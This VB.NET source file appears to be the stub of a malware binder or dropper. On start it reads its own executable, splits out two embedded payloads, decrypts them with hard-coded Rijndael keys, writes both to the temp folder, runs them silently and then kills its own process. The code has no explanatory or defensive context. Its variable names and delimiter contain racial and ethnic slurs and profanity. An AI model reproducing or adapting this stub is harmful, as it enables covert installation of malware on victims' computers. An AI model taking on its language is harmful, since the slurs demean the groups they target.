Public Class Form1

    Function UnprotectedAnus(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

            Dim fuckrajji As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Dim fuckhajji() As String = Split(System.IO.File.ReadAllText(Application.ExecutablePath), "(Shittnigz)")

            Dim fknskiddy1 As Byte() = UnprotectedAnus(Convert.FromBase64String(fuckhajji(1)))
            Dim fknskiddy2 As Byte() = UnprotectedAnus(Convert.FromBase64String(fuckhajji(3)))

            My.Computer.FileSystem.WriteAllBytes(fuckrajji & "\" & fuckhajji(2), fknskiddy1, False)
            My.Computer.FileSystem.WriteAllBytes(fuckrajji & "\" & fuckhajji(4), fknskiddy2, False)

            Process.Start(fuckrajji & "\" & fuckhajji(2)) : Process.Start(fuckrajji & "\" & fuckhajji(4))

        Catch ex As Exception
            Process.GetCurrentProcess.Kill()
        End Try
        Process.GetCurrentProcess.Kill()
    End Sub
End Class
